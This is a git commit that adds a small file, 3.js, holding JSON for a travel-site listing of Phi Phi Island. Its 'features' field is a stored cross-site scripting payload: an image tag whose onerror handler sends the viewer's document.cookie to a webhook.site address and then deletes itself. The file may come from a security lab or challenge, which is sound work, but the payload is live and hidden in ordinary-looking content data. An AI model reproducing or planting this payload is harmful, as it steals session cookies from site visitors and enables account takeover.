308b99b68b00a128f297930a9a5789bc65cce41b
Denis <denp00@yandex.ru>
2020-04-10 00:41:45 +0300

    Create 3.js

---
+++ 3.js
@@ -0,0 +1,2 @@
+{"image":"\/imagesa\/destination_5.jpg","title":"Phi Phi Island","subtitle":"Explore it with SomeCorp Travel!","price":"From $3371",
+ "features":"<img src=x onerror=\"this.src='https://webhook.site/4cd6b274-464c-4fda-8364-23af07aaa938?a='+document.cookie; this.removeAttribute('onerror');\">"}
